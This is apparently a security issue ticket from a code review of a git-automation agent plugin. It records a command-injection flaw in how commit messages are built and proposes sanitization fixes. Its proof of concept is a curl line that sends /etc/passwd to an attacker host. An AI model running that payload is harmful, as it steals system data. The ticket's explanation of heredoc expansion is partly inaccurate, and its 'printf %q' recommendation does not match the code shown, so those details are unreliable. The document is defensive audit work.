---
status: complete
priority: p1
issue_id: "045"
tags: [code-review, security, command-injection]
dependencies: []
pr_number: 12
---

# 🔴 P1: Command Injection via Unsanitized Todo Titles in Commit Messages

## Problem Statement

The debt-fixer agent constructs git commit messages using heredoc pattern but does NOT properly sanitize variables before interpolation. Variables like `$safe_title` are expanded within the heredoc, allowing command injection through malicious finding titles.

**Why this matters**: Arbitrary command execution during git commit could enable data exfiltration, credential theft, or supply chain attacks. This is a CRITICAL security vulnerability that BLOCKS merge.

## Findings

**Location**:
- `plugins/yellow-debt/agents/remediation/debt-fixer.md:115-134`
- `plugins/yellow-debt/commands/debt/fix.md:154-166`

**Current vulnerable code**:
```bash
gt modify -c "$(cat <<'EOF'
fix: resolve $safe_title

Resolves todo: $todo_path
Category: $category
Severity: $severity
EOF
)"
```

**The problem**: Even with heredoc `<<'EOF'` (single-quoted), the outer `$()` command substitution causes variable expansion. Shell metacharacters in variables could be interpreted.

**Proof of concept**:
```bash
finding_title="; curl https://attacker.com/exfil?data=$(cat /etc/passwd | base64); echo "
```

**Source**: Security Sentinel agent comprehensive audit

## Proposed Solutions

### Solution 1: Use printf %q for Shell-Safe Quoting (Recommended)

**Pros:**
- Native bash quoting mechanism
- Handles all edge cases
- Clear and auditable

**Cons:**
- Bash-specific (not POSIX)
- Slightly more complex

**Effort**: Small (30 min)
**Risk**: Low

**Implementation**:
```bash
safe_title=$(printf '%s' "$finding_title" | LC_ALL=C tr -cd '[:alnum:][:space:]-_.' | cut -c1-72)

git commit -m "$(printf 'fix: resolve %s\n\nResolves todo: %s\nCategory: %s\nSeverity: %s' \
  "$safe_title" "$todo_path" "$category" "$severity")"
```

### Solution 2: Literal Placeholders with sed Replacement

**Pros:**
- POSIX-compliant
- Explicit placeholder pattern
- Easy to audit

**Cons:**
- More code (temp file handling)
- sed escaping complexity

**Effort**: Small (1 hour)
**Risk**: Low

**Implementation**:
```bash
cat > .debt/commit-msg.tmp <<'EOF'
fix: resolve <TITLE>

Resolves todo: <PATH>
Category: <CATEGORY>
Severity: <SEVERITY>
EOF

sed -i "s|<TITLE>|${safe_title}|g" .debt/commit-msg.tmp
git commit -F .debt/commit-msg.tmp
rm .debt/commit-msg.tmp
```

### Solution 3: Use git commit --message Multiple Times

**Pros:**
- Simplest approach
- No heredoc complexity
- No temp files

**Cons:**
- Multiple -m flags less readable
- Formatting control limited

**Effort**: Quick (15 min)
**Risk**: Very Low

**Implementation**:
```bash
git commit \
  -m "fix: resolve ${safe_title}" \
  -m "Resolves todo: ${todo_path}" \
  -m "Category: ${category}" \
  -m "Severity: ${severity}"
```

## Recommended Action

**Use Solution 1** (printf %q) - most secure and bash-native.

## Technical Details

**Affected Components**:
- debt-fixer agent (agents/remediation/debt-fixer.md)
- fix command (commands/debt/fix.md)

**Attack Surface**: Any scanner output with malicious title

**Severity Justification**:
- Exploitability: High (scanners process untrusted code)
- Impact: Critical (RCE, credential theft, supply chain)
- OWASP: A03 Injection

## Acceptance Criteria

- [ ] Commit message construction uses safe quoting mechanism
- [ ] Manual security test with malicious title passes
- [ ] No shell metacharacters executed during commit
- [ ] Sanitization handles Unicode, newlines, all special chars
- [ ] Applied to both debt-fixer.md and fix.md

## Work Log

**2026-02-13**: Finding identified by Security Sentinel agent during comprehensive PR review

## Resources

- Security audit: `docs/solutions/security-issues/yellow-debt-plugin-security-audit.md:31-113`
- PR: https://app.graphite.com/github/pr/KingInYellows/yellow-plugins/12
- Agent workflow security patterns: `docs/solutions/security-issues/agent-workflow-security-patterns.md`

### 2026-02-13 - Approved for Work
**By:** Triage Session
**Actions:**
- Issue approved during code review triage
- Status changed from pending → ready
- Ready to be picked up and worked on
